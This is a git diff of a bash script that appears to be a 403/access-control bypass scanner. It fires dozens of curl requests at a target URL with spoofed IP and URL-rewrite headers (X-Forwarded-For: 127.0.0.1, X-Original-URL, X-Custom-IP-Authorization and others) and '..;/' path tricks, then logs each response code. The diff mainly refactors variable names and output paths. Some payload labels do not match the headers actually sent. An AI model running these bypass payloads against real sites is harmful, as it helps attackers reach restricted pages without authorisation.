@@ -53,12 +53,6 @@ if [[ ! "$URL" =~ ^https?://[^/]+/.*$ ]]; then
 	exit 42
 fi
 
-target=$(echo $URL | cut -d "/" -f1-3)
-domain=$(echo $URL | cut -d "/" -f3)
-path=$(echo $URL | cut -d "/" -f4- )
-user_agent="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
-outdir="scan-$domain-$(date '+%Y-%m-%d-%T')"
-
 SCHEME=$(echo "$URL" | cut -d: -f1)
 echo "SCHEME=$SCHEME"
 VHOST=$(echo "$URL" | cut -d/ -f3)
@@ -67,15 +61,17 @@ echo "VHOST=$VHOST"
 PAT=$(echo "$URL" | cut -d/ -f4-)
 echo "PAT=$PAT"
 
-mkdir -pv "$outdir"
+user_agent="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
+outdir="scan-$VHOST-$(date '+%Y-%m-%d-%T')"
+mkdir -pv "$outdir" && cd "$outdir"
 
 echo -e ${blue}"----------------------"${end}
 echo -e ${cyan}"[+] Original request  "${end}
 echo -e ${blue}"----------------------"${end}
 
 echo -n "Clean request test Payload:"
-echo curl --path-as-is -skg -o "$outdir/original.html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/original.html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "original.html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "original.html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "$URL" -H "$user_agent")
 print
 
 echo -e ${blue}"----------------------"${end}
@@ -83,224 +79,224 @@ echo -e ${cyan}"[+] HTTP Header Bypass"${end}
 echo -e ${blue}"----------------------"${end}
 
 echo -n "X-Originally-Forwarded-For Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Originating-  Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Originating-IP Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
 print
 echo -n "True-Client-IP Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "True-Client-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "True-Client-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "True-Client-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "True-Client-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
 print
 echo -n "True-Client-IP Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
 print
 echo -n "From Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Profile http:// Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Profile: http://$domain" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Profile: http://$domain" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Profile: http://$VHOST" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Profile: http://$VHOST" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Arbitrary http:// Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Arbitrary: http://$domain" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Arbitrary: http://$domain" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Arbitrary: http://$VHOST" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Arbitrary: http://$VHOST" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-HTTP-DestinationURL http:// Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-HTTP-DestinationURL: http://$domain" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-HTTP-DestinationURL: http://$domain" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-HTTP-DestinationURL: http://$VHOST" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-HTTP-DestinationURL: http://$VHOST" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Forwarded-Proto http:// Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Proto: http://$domain" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Proto: http://$domain" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Proto: http://$VHOST" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Proto: http://$VHOST" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Destination Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Destination: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Destination: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Destination: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Destination: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Proxy Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
 print
 echo -n "CF-Connecting_IP:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting_IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting_IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting_IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting_IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
 print
 echo -n "CF-Connecting-IP:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Referer Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referer: $URL" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referer: $URL" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referer: $URL" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referer: $URL" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Custom-IP-Authorization Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Custom-IP-Authorization..;/ Payload"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL..;/" -H "$user_agent")
 print
 echo -n "X-Originating-IP Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Forwarded-For Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Remote-IP Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Client-IP Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Host Payload"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Forwarded-Host Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Original-URL Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-URL: /$path" -X GET "$target/anything" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-URL: /$path" -X GET "$target/anything" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-URL: /$PAT" -X GET "$URL/anything" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-URL: /$PAT" -X GET "$URL/anything" -H "$user_agent")
 print
 echo -n "X-Rewrite-URL Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Rewrite-URL: /$path" -X GET "$target" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Rewrite-URL: /$path" -X GET "$target" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Rewrite-URL: /$PAT" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Rewrite-URL: /$PAT" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Content-Length Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Content-Length: 0" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Content-Length: 0" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Content-Length: 0" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Content-Length: 0" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-ProxyUser-Ip Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-ProxyUser-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-ProxyUser-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-ProxyUser-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-ProxyUser-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Base-Url Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Base-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Base-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Base-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Base-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Client-IP Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Http-Url Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Http-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Http-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Http-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Http-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Proxy-Host Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Proxy-Url Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Real-Ip Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Redirect Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Redirect: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Redirect: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Redirect: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Redirect: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Referrer Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referrer: 127.0.0.1" -X GET "$URL" -H "$user_agent"
